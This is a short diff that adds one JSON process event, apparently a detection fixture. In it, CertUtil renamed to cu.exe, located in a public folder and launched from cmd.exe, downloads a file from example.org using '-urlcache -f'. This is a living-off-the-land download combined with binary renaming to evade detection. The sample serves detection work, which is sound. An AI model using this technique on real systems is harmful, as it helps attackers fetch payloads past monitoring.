@@ -1,0 +1,3 @@
+{"Image": "C:\\Users\\Public\\cu.exe", "OriginalFileName": "CertUtil.exe",
+ "CommandLine": "cu.exe -urlcache -f https://example.org/a.txt a.txt",
+ "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
